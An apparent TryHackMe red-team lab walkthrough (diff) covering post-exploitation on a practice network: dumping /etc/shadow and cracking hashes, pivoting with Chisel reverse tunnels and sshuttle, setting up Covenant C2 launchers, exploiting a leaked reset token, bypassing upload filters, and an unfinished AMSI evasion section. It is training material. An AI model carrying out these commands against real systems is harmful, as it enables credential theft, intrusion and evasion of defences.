@@ -640,5 +640,1064 @@ If successful, you should now have the same permission levels as the binary you 
 
 **What is the full first line of the exploit for the SUID bit?**
 
+## Post Exploitation -  From the Shadows
+
+Now that we have gained a decent foothold onto the network and have a stable shell, we can worry about setting up persistence so that we don't lose our foothold and gain our foothold again if the machine is reset or our shell gets terminated. There are many methods for persistence outlined below are a few examples.
+
+* LD\_PRELOAD
+* Backdoored binaries
+* PAM backdoor
+* SSH keys
+* Malicious services
+* Cronjob
+* Credential harvesting
+
+In this room, we will be focusing on credential harvesting specifically from the shadow file and how to crack passwords offline to gain long-term account access.\
+
+
+For more information about persistence techniques check out MITRE ATT\&CK [TA0003](https://attack.mitre.org/tactics/TA0003/).\
+
+
+***
+
+To begin with our persistence adventures, we will be focusing on dumping the shadow file on a Linux server. The shadow file is located in `/etc/shadow` and contains encrypted passwords and related information, including usernames, password change date, expiration, etc. We can use this file to retrieve hashes as an attacker and then attempt to crack the hashes using an offline hash cracking tool like Hashcat or JohntheRipper.\
+
+
+Since the shadow file is a standard in the Linux kernel to authenticate accounts, you can expect it on every \*nix machine you encounter.\
+
+
+To dump the shadow file is simple; once you have root privileges, you need to read the file, and the machine will output the information in the shadow file. Find an example command below.\
+
+
+Command used: `cat /etc/shadow`
+
+<figure><img src="https://i.imgur.com/we37uWq.png" alt=""><figcaption></figcaption></figure>
+
+We now have all the account hashes stored by the system. From here, we can take them offline and attempt to crack them in the next task.
+
+### Answer the questions
+
+**What non-default user can we find in the shadow file on L-SRV01?**
+
+## Post Exploitation - Crack all the Things
+
+A somewhat important part of red team operations is hash cracking. We can use hashcat or johntheripper to crack a provided hash by comparing it against a provided wordlist such as rockyou.txt. In this task, we will be using the power of google colab to crack hashes for us.\
+
+
+From google colaboratory, "Colaboratory, or "Colab" for short, allows you to write and execute Python in your browser" This means that we can take advantage of it with pre-built workspaces to install and run hashcat on google's cloud infrastructure and crack our hashes with a high-end GPU.\
+
+
+To begin using colabcat, we will need to identify the Hashcat mode to use against the hashes. The shadow file uses the generic Linux hash `$6$`; this is a sha512crypt, which we can identify as mode 1800. For more information about hashcat types, check out the hashcat example page, [https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example\_hashes).\
+
+
+Now we can use the colabcat repo, [https://github.com/someshkar/colabcat](https://github.com/someshkar/colabcat), to start up a colab instance with the hashcat settings pre-prepared.\
+
+
+**Note:** To use colabcat you will first need a google account.\
+
+
+To begin preparing the instance, you need to follow the prompts and execute the pre-set commands in each box. Find an example of running pre-set commands below.
+
+\
+
+
+<figure><img src="https://i.imgur.com/1vjYZKd.png" alt=""><figcaption></figcaption></figure>
+
+Continue following the prompts to authorize your google account to connect to the colab instance. The below box is the step at which we can change the commands to crack our hashes.\
+
+
+![](https://i.imgur.com/1q81Bi8.png)\
+
+
+To begin cracking your hash, place the shadow hash inside of `/root/.hashcat/hashes/shadow.hash`. You can then specify the wordlist you would like to use to crack the hash; we recommend using rockyou.txt, to begin.
+
+### Answer the questions
+
+**What is the plaintext cracked password from the shadow hash?**
+
+
+
+## Pivoting -  Digging a tunnel to nowhere
+
+Now that you have gained root access to L-SRV01, you need to identify where to go next. You know there are no other external machines in scope, so you decide to move into the internal network. To gain access to the internal subnet, you need to perform what is known as pivoting.
+
+In a well-maintained network, often referred to as a "Segmented Network," there are specific rules in place preventing users from accessing certain parts of the Internal LAN (ex. The Workstation Subnet should not be able to access the Server Subnet). We will need to "pivot" from an already compromised server using a SOCKs server or other means like port forwarding to access different network resources.\
+
+
+There are several tools outlined below that can help us in pivoting.\
+
+
+* sshuttle
+* Chisel
+* Ligolo
+* Metasploit autoroute
+
+In this task, we will be focusing on both Chisel and sshuttle, each offering unique ways to approach pivoting.\
+
+
+The first tool that we will be looking at is Chisel. From the Chisel GitHub, "Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable, including both client and server. Written in Go (Golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network."\
+
+
+From the Chisel GitHub, below is an overview of chisel architecture.
+
+![](https://camo.githubusercontent.com/6209fb99bc6edcb2341900468f78b09f03d0be74e03b48e49beb87c52b55362c/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230)
+
+To begin using Chisel, we must first download the tool. If you utilize the stable release or docker, you will not need to download any dependencies. If you compile from source, you will need to install a few dependencies outlined on their GitHub. There are three common ways of obtaining the tool, outlined below.\
+
+
+* Stable release: [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
+* Docker: `docker run --rm -it jpillora/chisel --help`
+* Source: `go get -v [github.com/jpillora/chisel](<http://github.com/jpillora/chisel>)`
+
+To set up the Chisel server on a Windows machine, you will need to get the Windows binary and vice versa.\
+
+
+To create a SOCKs server with Chisel, you will only need two commands ran on the target and the attacking machine, outlined below.\
+
+
+On the attacking machine: `./chisel server -p 8000 --reverse`
+
+On the target machine: `./chisel client <SERVER IP>:8000 R:socks`
+
+Now that we have a SOCKs server set up, we need to interpret and manage these connections. This is where proxychains come in. Proxychains allows us to connect to the SOCKs server and route traffic through the proxy in the command line. To add the SOCKs server to proxychains, you will need to edit `/etc/proxychains.conf`. You can see an example configuration below.\
+
+
+![](https://i.imgur.com/PLDdyI8.png)
+
+You will need to add the following line to the configuration file: `socks5 127.0.0.1 1080`
+
+To use the proxy, you will need to prepend any commands you want to route through the proxy with proxychains. An example usage can be found below.\
+
+
+Example usage: `proxychains curl http://<IP>`
+
+The second tool we will be looking at is sshuttle. Sshuttle is unique in its approaches to pivoting because all of its techniques are done remotely from the attacking machine and do not require the configuration of proxychains. However, a few of the disadvantages of sshuttle are that it will only work if there is an ssh server running on the machine, and it will not work on Windows hosts. You can download sshuttle from GitHub, [https://github.com/sshuttle/sshuttle](https://github.com/sshuttle/sshuttle)\
+
+
+Using sshuttle is relatively easy and only requires one command. For sshuttle to work, you only need to specify one parameter, -r . With this parameter, you will specify the user and target like you would for a standard ssh connection. You will also need to specify the CIDR range of the network; this does not require a parameter. Find an example of syntax below.\
+
+
+Syntax: `sshuttle -r USER@MACHINE_IP 0.0.0.0/0`
+
+For more information about sshuttle and how to use it, check out the documentation, [https://sshuttle.readthedocs.io/en/stable/overview.html](https://sshuttle.readthedocs.io/en/stable/overview.html).
+
+## Command and Control - Command your Foes and Control your Friends
+
+From scanning the internal network, we know that the rest of the network is Windows hosts. When in an engagement, red teams will often utilize a C2 server as a base of operations to help operationalize payloads and maintain access using modules. We will be setting up our C2 server and getting familiar with its operations before moving on to attacking the rest of the network.
+
+We can use a command and control server to organize users and deploy modules or tasks on a compromised device. Rather than using reverse shells and payloads, you can use a stager and listeners with a C2 server to help a red team through an engagement. Throughout this walkthrough, we will use the [Covenant](https://github.com/cobbr/Covenant), developed by Cobbr and the SpectreOps Team. If you prefer to use another C2 framework like Empire or Cobalt Strike, you can use them; however, the modules and stagers may be different than shown.
+
+From the Covenant GitHub, "Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers."
+
+![](https://raw.githubusercontent.com/wiki/cobbr/Covenant/covenant.png)
+
+For more information about Covenant, check out the Covenant GitHub wiki, [https://github.com/cobbr/Covenant/wiki](https://github.com/cobbr/Covenant/wiki)
+
+The Covenant installation is relatively straightforward, with a few quirks and areas that may need troubleshooting. The installation requires two separate central installs: .NET Core SDK and downloading Covenant itself.\
+
+
+To begin setting up Covenant, we will begin with installing the .NET Core SDK. Covenant requires .NET Core SDK 3.1.0. You can download the SDK from either the .NET downloads page or adding the .NET repositories and downloading via apt.
+
+For more information about downloading via the downloads page, check out this link, [https://dotnet.microsoft.com/download/dotnet/3.1](https://dotnet.microsoft.com/download/dotnet/3.1).\
+
+
+For more information about downloading via the repositories, check out this link, [https://docs.microsoft.com/en-us/dotnet/core/install/linux-ubuntu](https://docs.microsoft.com/en-us/dotnet/core/install/linux-ubuntu)\
+
+
+Follow along with either of the methods and install .NET Core SDK 3.1.0. This will be the utility we use to build and run Covenant.\
+
+
+Once you have the SDK installed, you can clone the Covenant repository from GitHub. Find an example below.\
+
+
+Command used: `git clone --recurse-submodules https://github.com/cobbr/Covenant`
+
+Since Covenant is written entirely in .NET Core, all dependencies are already handled when building with the SDK.\
+
+
+Now that both the SDK and Covenant are installed, we can start up Covenant for the first time. Covenant will start on localhost port 7443. Find example syntax below.\
+
+
+Command used: `sudo ./dotnet run --project /opt/Covenant/Covenant`
+
+Once you navigate to [127.0.0.1:7443](http://127.0.0.1:7443/) you will be greeted with a user creation screen. Create a user and sign in to Covenant. Find an example of the sign-in page below.\
+
+
+![](https://i.imgur.com/NResXyy.png)
+
+If successfully signed in, you should be met with a dashboard like the one shown below.
+
+<figure><img src="https://i.imgur.com/Ey3jVR8.png" alt=""><figcaption></figcaption></figure>
+
+## Command and Control -  Bug on the Wire
+
+Now that we have Covenant set up and signed in, we can begin covering the basics of operating and creating a listener with Covenant. This will be helpful later when you get onto a Windows box and deploy a grunt quickly.\
+
+
+When operating with Covenant, there are four main stages: creating a listener, generating a stager, deploying a grunt, utilizing the grunt. All stages of operation can already be done using other tools like MSFVenom, Netcat, Metasploit, etc. however, Covenant gives you a way to operationalize them all under one platform allowing for easier management and collaborative operations.\
+
+
+Covenant is an extensive and diverse command and control framework with many different functionalities. We will only be covering the basics of operating with Covenant. For more information, check out the SpecterOps blog, [https://posts.specterops.io/](https://posts.specterops.io/), and the SoCon talk on "Operating with Covenant" by Ryan Cobb and Justin Bui [https://www.youtube.com/watch?v=oN\_0pPI6TYU](https://www.youtube.com/watch?v=oN\_0pPI6TYU).\
+
+
+The first step in operating with Covenant is to create a listener. Listeners are built off profiles; you can think of profiles like HTTP requests/pages that will serve as the channel that will handle all C2 traffic. There are four default profiles that Covenant comes with, outlined below.
+
+* `CustomHttpProfile` Custom profile that does not require any cookies.
+* `DefaultBridgeProfile` Default profile for a C2 bridge.
+* `DefaultHttpProfile` Default HTTP profile.
+* `TCPBridgeProfile` Default TCP profile for a C2 bridge.
+
+Covenant offers an easy way of editing the listeners along with a GUI. There are many parameters present; we will only be going over a quick overview of each parameter outlined below.
+
+* `Name` Name of profile to be used throughout the interface.
+* `Description` Description of profile and its use cases.
+* `MessageTransform` Specify how data will be transformed before being placed in other parameters.&#x20;
+* `HttpUrls` list of URLs the grunt can callback to.
+* `HttpRequestHeaders` List of header pairs (name/value) that will be sent with every HTTP request.
+* `HttpResponseHeaders` List of header pairs (name/value) that will be sent with every HTTP response.
+* `HttpPostRequest` Format of data when a grunt posts data back to the profile.
+* `HttpGetResponse` HTTP response when a grunt GETs data to the listener.
+* `HttpPostResponse` HTTP response when a grunt POSTs data to the listener.
+
+We will be going further in-depth with editing and creating profiles in Task 26.\
+
+
+Once you have decided what profile you would like to use, we can begin creating the listener. We recommend using the _DefaultHttpProfile_, to start with, but we will be changing this in later tasks when dealing with AV evasion.\
+
+
+To create a listener, navigate to the _Listeners_ tab from the side menu and select _Create Listener_.\
+
+
+You will see several options to edit; each option is outlined below.
+
+* `Name` (optional) will help to identify different listeners.
+* `BindAddress` Local address listener will bind on, usually `0.0.0.0`.
+* `BindPort` Local port listener will bind on.
+* `ConnectPort` Port to callback to, suggested to set to `80`, `8080`, or `8888`.
+* `ConnectAddresses` Addresses for the listener to callback to, hostname portion of the `URL`.
+* `URLs` Callback URLs the grunt will be connected directly back to.
+* `UseSSL` Determines whether or not the listener uses `HTTP` or `HTTPS`.
+* `SSLCertificate` Certificate used by the listener if SSL is set to true.
+* `SSLCertificatePassword` Password being used by the `SSLCertificate`.
+* `HttpProfile` Profile used by the listener and grunt to determine communication behavior.
+
+To create a basic listener for this network we only suggest editing the `Name`, `ConnectPort`, and `ConnectAddresses`\
+
+
+Once created, the listener should appear within the Listeners tab. You can now start and stop the listener as needed.\
+
+
+<figure><img src="https://i.imgur.com/6mFpwNR.png" alt=""><figcaption></figcaption></figure>
+
+## Command and Control - The Blood Oath
+
+Now that we have a listener in Covenant, we can create a launcher to deploy a grunt. Again, this will be helpful later when you get onto a Windows box and need to deploy a grunt quickly.\
+
+
+From the Covenant GitHub, "Launchers are used to generate, host, and download binaries, scripts, and one-liners to launch new Grunts."\
+
+
+There are ten different launchers to choose from within Covenant, each launcher will have its requirements, and some may not be supported on modern operating systems. Launcher types are outlined below.
+
+* `Binary` Generates a custom binary to launch grunt, does not rely on a system binary.
+* `Shellcode` Converts binary to shellcode using donut, [https://github.com/TheWover/donut](https://github.com/TheWover/donut)
+* `PowerShell` Generates PowerShell code to launch a grunt using `powershell.exe`.
+* `MSBuild` Generates an MSBuild XML file to launch a grunt using `msbuild.exe`, [https://lolbas-project.github.io/lolbas/Binaries/Msbuild/](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)
+* `InstallUtil` Generates an InstallUtil XML file to launch a grunt using `installutil.exe`, [https://lolbas-project.github.io/lolbas/Binaries/Installutil/](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)
+* `Mshta` Generates an HTA file to launch a grunt using `mshta.exe`, [https://lolbas-project.github.io/lolbas/Binaries/Mshta/](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
+* `Regsrv32` Generates an SCT file to launch a grunt using `regsrv32.exe`, [https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
+* `Wmic` Generates an XSL file to launch a grunt using `wmic.exe`, [https://lolbas-project.github.io/lolbas/Binaries/Wmic/](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
+* `Cscript` Generate a JScript file to launch a grunt using `cscript.exe`, [https://lolbas-project.github.io/lolbas/Binaries/Cscript/](https://lolbas-project.github.io/lolbas/Binaries/Cscript/)
+* `Wscript` Generate a JScript file to launch a grunt using `wscript.exe`, [https://lolbas-project.github.io/lolbas/Binaries/Wscript/](https://lolbas-project.github.io/lolbas/Binaries/Wscript/)
+
+There are several options for each launcher, with some launchers having specific options. For this task, we will be focusing on the binary launcher and its options. The configuration options are outlined below.
+
+* `Listener` Listener the grunt will communicate with.
+* `ImplantTemplate` Type of implant launcher will use.
+* `DotNetVersion` .NET version launcher will use, dependent on `ImplantTemplate`.
+* `Delay` Time grunt will sleep in-between callbacks. A larger delay can aid in stealthy communications.
+* `JitterPercent` Percent of variability in `Delay`.
+* `ConnectAttempts` Amount of times grunt will attempt to connect back to the server before quitting.
+* `KillDate` Date specified grunt will quit and stop calling back.
+
+To create a basic launcher for this network, we only suggest editing the `Listener` and `ImplantTemplate`\
+
+
+Once created, the launcher will be downloaded or output a one-liner that can be copied. You can then use the launcher as needed to deploy grunts.\
+
+
+![](https://i.imgur.com/IREQTwm.png)
+
+To deploy a grunt, you will only need to transfer your launcher to your target machine and execute the payload using your preferred method; this will change based on what launcher you decide to use.\
+
+
+Once executed, the grunt should check back into the server and appear within the _Grunt_ tab.\
+
+
+**Note:** This is only an example of executing a grunt; you will not need to execute a grunt until later tasks.\
+
+
+![](https://i.imgur.com/sk5C4K7.png)
+
+If you navigate to the grunt to interact with it, you will be given an interaction menu. From here, you can remotely control the grunt and execute shell commands and modules. This will be covered further in-depth in Task 29.\
+
+
+![](https://i.imgur.com/XSEdAaJ.png)\
+
+
+### Answer the questions&#x20;
+
+**Read the above and practice building a launcher.**
+
+## Command and Control -  We ran out of Halo and YAML references...
+
+A large part of operating with Covenant is task usage. Covenant, by default, does not come with a large number of tasks/modules to choose from like other C2 frameworks like Empire and PoshC2. This means that we will need to create our own tasks of tools that we want to use within Covenant. Luckily for us, Covenant is built off .NET and C#, making it easy to convert any C# code into a task.\
+
+
+For this task, we will be converting SharpEDRChecker into a Covenant task; this will later be used in Task 36.\
+
+
+Since Covenant v0.5, the way that the Covenant backend intakes and parses tasks has changed. Covenant now utilizes YAML files to define tasks and task data. From the YAML website, "YAML is a human-friendly data serialization standard for all programming languages." This makes it easy for developers and operators to weaponize and integrate tooling into Covenant.\
+
+
+Find an outline below of rules you need to have in mind when building tasks to ensure that your task integrates with the grunt.
+
+* Define a class called `Task`
+* Define a method called `Execute`
+* Return a string
+
+We will begin by using an example template that we can later modify and add references to. Find an example YAML template for Covenant below.
+
+```yaml
+- Name: Example
+  Aliases: []
+  Description: Example task for Covenant
+		Name: Tryhackme 
+		Handle: THM_User
+		Link: <https://twitter.com/RealTryHackMe>
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+	public static class Task {
+	    public static string Execute() {
+	        return "Hello Covenant!";
+	    }
+	} 
+```
+
+The above is a basic template that we can use to get the basic structure of our task down. Find an explanation of each YAML tag below.\
+
+
+* `Name` Name of the task in Covenant UI.
+* `Aliases` Aliases or shortcuts for the task.
+* `Description` Description of the task in Covenant UI.
+* `Language` Language the task source code is written in.
+* `CompatibleDotNetVersions` Versions of .NET the source code will run on.
+* `Code` Source code of task.
+
+We have a basic structure for our task data, but our task will still not work. Covenant uses .NET; we need to define our reference assemblies that .NET will use to interpret our code and provide basic functionality. Find an example YAML template for reference assemblies below.
+
+```yaml
+ ReferenceAssemblies:
+    - Name: mscorlib.dll
+      Location: net35\\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\\System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\\System.Core.dll
+      DotNetVersion: Net35
+	    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40 
+```
+
+Depending on what project we are working on and what assemblies it uses will depend on how many and what reference assemblies we add to this template. For our example task, we will only need to add basic assemblies found in the template above.\
+
+
+This method of adding reference assemblies can also be used to add reference sources; this is how we can add external C# code. We will be covering this in more depth later in this task.\
+
+
+We can add together the above YAML to create a final example template that we can use to test our task source code. Find the YAML template below.
+
+```yaml
+- Name: Example
+  Aliases: []
+  Description: Example task for Covenant
+      Name: Tryhackme 
+      Handle: THM_User
+      Link: <https://twitter.com/RealTryHackMe>
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+	public static class Task {
+	    public static string Execute() {
+	        return "Hello Covenant!";
+	    }
+	}
+TaskingType: Assembly
+UnsafeCompile: false
+TokenTask: false
+Options: []
+ReferenceAssemblies:
+	- Name: mscorlib.dll
+	Location: net35\\mscorlib.dll
+	DotNetVersion: Net35
+	- Name: System.dll
+	Location: net35\\System.dll
+	DotNetVersion: Net35
+	- Name: System.Core.dll
+	Location: net35\\System.Core.dll
+	DotNetVersion: Net35
+	- Name: mscorlib.dll
+	Location: net40/mscorlib.dll
+	DotNetVersion: Net40
+	- Name: System.dll
+	Location: net40/System.dll
+	DotNetVersion: Net40
+	- Name: System.Core.dll
+	Location: net40/System.Core.dll
+	DotNetVersion: Net40
+EmbeddedResources: []
+ReferenceAssemblies: []
+EmbeddedResources: [] 
+```
+
+You can add this YAML file under `Covenant/Covenant/Data/Tasks/`. If we rebuild and run Covenant, our newly created task should appear within the UI and can be used with any grunts now.\
+
+
+Now that we have a basic task working, we can attempt to convert SharpEDRChecker to Covenant. This process is not as hard as it seems and is fully outlined below.\
+
+
+First, we will want to place the entire SharpEDRChecker source code repository in `Covenant/Covenant/Data/ReferenceSourceLibraries/`. This will allow Covenants backend to integrate and parse the source code and references of the tool.\
+
+
+You can also import PowerShell scripts or commands using the PowerShell and PowerShellImport tasks along with creating your own tasks.\
+
+
+### Answer the questions&#x20;
+
+**Read the above and practice converting offensive tools to Covenant tasks.**
+
+## Web App Exploitation - Hide yo' Kids, Hide yo' Wives, Hide yo' Tokens
+
+Now that we have access to the internal network and have identified a new target, S-SRV01. We know that S-SRV01 has an open web server that we can look at to begin our attack.\
+
+
+We have a few credentials that we can try as well as a username and username scheme that we can use to attempt to gain access to the website.\
+
+
+Looking through the web app, we see a password reset and a valid username. We can poke at the web app to identify vulnerabilities that we can exploit to gain access to the webserver.
+
+Password resets will typically utilize tokens to keep track of users. They will authenticate a reset request as it is sent. The web app will send the token privately when a reset is requested. Sometimes a reset can be misconfigured and leak the token used to spoof a user and reset a controlled user's password. We will be covering an example of this vulnerability along with the vulnerable source code below.\
+
+
+To understand this vulnerability, we can begin by looking at the source code behind the vulnerability. All code below is performed server-side; however, testers can find the token by looking through client-side storage.
+
+```
+db.findOne({ email:emailAddress }, function(err, doc) {
+      if(!doc){
+   return res.send('Email address not in our system');
+      }else{
+   var secret = doc.password + '-' +doc.createdTime;
+          var payload = {
+              id: doc._id,
+              email: doc.email
+          };
+         var token = jwt.encode(payload, secret);
+   res.json({
+       resettoken: token,
+       status: 'Success'
+   });
+   res.end(); 
+   }
+  });
+```
+
+The specific part of the code that is vulnerable is when the `resettoken` is sent via JSON. This will leak the token to client-side storage. Find the specific code block below.
+
+```
+res.json({
+ resettoken: token,
+ status: 'Success'
+});
+```
+
+To exploit this, we can utilize Chrome and/or Firefox developer tools. Responses from the web server can be in the form of a cookie or a JSON token stored in client-side storage.
+
+You can find the token under either _Application_ for a cookie or _Network_ for a JSON token.
+
+<figure><img src="https://i.imgur.com/J1II5W7.png" alt=""><figcaption></figcaption></figure>
+
+Once you have retrieved the token from the JSON response or cookie, you can submit it within the URL query under _?token_.\
+
+
+It is important to note that each company or webserver will handle resets and tokens differently. Some may opt for a JWT solution; others may prefer a local database solution; it all depends on the developers themselves, and vulnerabilities may change depending on how the server-side code is written.
+
+### Answer the questions
+
+**What user can we control for a password reset on S-SRV01?**
+
+**What is the name of the cookie intercepted on S-SRV01?**
+
+**What is the size of the cookie intercepted on S-SRV01?**
+
+**What page does the reset redirect you to when successfully authenticated on S-SRV01?**
+
+## Web App Exploitation - Thanks, I'll let myself in.
+
+Now that we have successful authentication to the web app we know that we have an upload page, however, from code analysis the page uses client-side filtering meaning we can only upload images. We can bypass these filters using BurpSuite.
+
+From GeekforGeeks, client-side filtering is, "These are the types of filter checks present in the browser itself. When the user types an input, the input is verified by the client-side filters. If the data entered by the user is valid, the input is accepted else an error is thrown depending on what wrong input the user has typed."
+
+### There are four easy ways to bypass a client-side upload filter:
+
+1. Turn off JavaScript in your browser - this will work provided the site doesn't require JavaScript in order to provide basic functionality. If turning off JavaScript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
+2. Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below.
+3.  Intercept and modify the file upload. Where the previous method works the webpage is loaded, this method allows the web page to load as normal but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process of using this method in the course of the task.
+
+    before
+4. Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like `curl`? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client-side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: `curl -X POST -F "submit=<value>" -F "<file-parameter>=@<path-to-file>" <site>`. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.
+
+To help us identify the client-side filtering and ways we can bypass it we can perform code analysis. Taking a look at the source code below, we see that it is using a basic JavaScript function to check for the MIME type of files.
+
+```
+<script>
+ windows.onload = function() {
+  var upload = document.getElementbyID("fileToUpload");
+  upload.value="";
+  upload.addEventListener("change",function(event) {
+   var file = this.files[0];
+   if (file.type != "imge/jpeg") {
+    upload.value="";
+    alert("dorkus storkus server bork");
+   }
+  });
+ };
+</script>
+
+```
+
+In this code, we can see that the filter is using a whitelist to exclude any MIME type that isn't `image/jpeg`.
+
+Our next step is to attempt a file upload -- as expected, if we choose a JPEG, the function accepts it. Anything else and the upload is rejected.
+
+Having established this, let's start [Burpsuite](https://blog.tryhackme.com/setting-up-burp/) and reload the page. We will see our own request to the site, but what we really want to see is the server's response, so right-click on the intercepted data, scroll down to "Do Intercept", then select "Response to this request":
+
+<figure><img src="https://i.imgur.com/T0RjAry.png" alt=""><figcaption></figcaption></figure>
+
+When we click the "Forward" button at the top of the window, we will then see the server's response to our request. Here we can delete, comment out, or otherwise break the JavaScript function before it has a chance to load.&#x20;
+
+\
+
+
+<figure><img src="https://i.imgur.com/ACgWLpH.png" alt=""><figcaption></figcaption></figure>
+
+Having deleted the function, we once again click "Forward" until the site has finished loading, and are now free to upload any kind of file to the website.
+
+It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script that is not inside the main page is loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove `^js$|`.\
+
+
+<figure><img src="https://i.imgur.com/95hi6pX.png" alt=""><figcaption></figcaption></figure>
+
+For more information on file upload vulnerabilities check out '[Upload Vulnerabilities](https://tryhackme.com/room/uploadvulns)' by MuirlandOracle.
+
+You can now attempt to upload your launcher or other payloads to the server but you might notice that when trying to execute them they will fail even if they are properly uploaded. This is because there may be some kind of AV or EDR solution active on the box. Move on to the next tasks to learn about AV evasion and how we can successfully pop a shell on the server.
+
+### Answer the questions
+
+**Read the above and attempt a client-side filter bypass on S-SRV01.**
+
+## AV Evasion - Basically a joke itself....
+
+Note: Before moving on with AV evasion please read the entire section's notes and tasks. This section contains multiple methods and techniques that you can mix and match to reach the end goal of evading anti-virus.\
+
+
+Now that we can upload a file, we notice that our shells are killed or fail at uploading because AV catches them. In the following six tasks, we will be covering the vast topic of AV evasion and how it can be used in conjunction with C2 frameworks like Covenant and offensive tooling. The following tasks compound each other; one task alone will not be enough to evade detections itself. You will need to combine many techniques shown until you have successfully written or created a clean payload/tool. To begin bypassing EDR solutions, we need to understand our first enemy, AMSI.
+
+The Anti-Malware Scan Interface (AMSI) is a PowerShell security feature that will allow any applications or services to integrate into antimalware products. AMSI will scan payloads and scripts before execution inside of the runtime. From Microsoft, "The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads."\
+
+
+For more information about AMSI, check out the Windows docs, [https://docs.microsoft.com/en-us/windows/win32/amsi/](https://docs.microsoft.com/en-us/windows/win32/amsi/)\
+
+
+Find an example of how data flows inside of Windows security features below.\
+
+
+![](https://docs.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg)
+
+AMSI will send different response codes based on the results of its scans. Find a list of response codes from AMSI below.
+
+* AMSI\_RESULT\_CLEAN = 0
+* AMSI\_RESULT\_NOT\_DETECTED = 1
+* AMSI\_RESULT\_BLOCKED\_BY\_ADMIN\_START = 16384
+* AMSI\_RESULT\_BLOCKED\_BY\_ADMIN\_END = 20479
+* AMSI\_RESULT\_DETECTED = 32768
+
+AMSI is fully integrated into the following Windows components.
+
+* User Account Control, or UAC
+* PowerShell
+* Windows Script Host (wscript and cscript)
+* JavaScript and VBScript
+* Office VBA macros
+
+AMSI is instrumented in both System.Management.Automation.dll and within the CLR itself. When inside the CLR, it is assumed that Defender is already being instrumented; this means AMSI will only be called when loaded from memory.\
+
+
+We can look at what PowerShell security features physically look like and are written using InsecurePowerShell, [https://github.com/PowerShell/PowerShell/compare/master...cobbr:master](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master) maintained by Cobbr. InsecurePowerShell is a GitHub repository of PowerShell with security features removed; this means we can look through the compared commits and identify any security features. AMSI is only instrumented in twelve lines of code under `src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs`. Find the C# code used to instrument AMSI below.
+
+```
+var scriptExtent = scriptBlockAst.Extent;
+ if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
+ {
+  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
+  throw new ParseException(new[] { parseError });
+ }
+
+ if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)
+ {
+  HasSuspiciousContent = true;
+ }
+```
+
+Third-parties can also instrument AMSI in their products using the methods outlined below.
+
+* AMSI Win32 API, [https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions)
+* AMSI COM Interface, [https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream)
+
+For more information about AMSI integration in third-party products, check out this Microsoft article, [https://docs.microsoft.com/en-us/windows/win32/amsi/dev-audience](https://docs.microsoft.com/en-us/windows/win32/amsi/dev-audience)\
+In the next task, we will look at how we can utilize PowerShell and C# to bypass AMSI.\
+
+
+### Answer the questions&#x20;
+
+**Read the above and investigate how AMSI is instrumented.**
+
+## AV Evasion -  THEY WONT SEE ME IF I YELL!
+
+Now that we understand the basics of AMSI and how its instrumented, we can begin bypassing AMSI using PowerShell and C#.\
+
+
+There are a large number of bypasses for AMSI available, a majority written in PowerShell and C#. Find a list of common bypasses below.
+
+* Patching amsi.dll
+* Amsi ScanBuffer patch
+* Forcing errors
+* Matt Graeber's Reflection, [https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
+* PowerShell downgrade
+
